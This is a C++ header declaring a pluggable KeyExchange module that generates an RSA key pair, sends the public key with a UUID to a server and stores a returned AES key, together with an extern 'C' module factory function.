#pragma once
#include "Module.h"
#include <string>
#include <openssl/rsa.h>

class KeyExchange : public Module {
public:
    explicit KeyExchange(const std::string& server_url);
    ~KeyExchange();
    std::string name() const override { return "KeyExchange"; }
    void init() override;
    const std::string& aes_key() const { return aes_key_; }
private:
    std::string server_url_;
    RSA* rsa_;
    std::string aes_key_;

    void generate_rsa();
    std::string public_key_pem() const;
    std::string send_public_key(const std::string& uuid);
    std::string base64_decode(const std::string& in);
};
extern "C" Module* create_module();
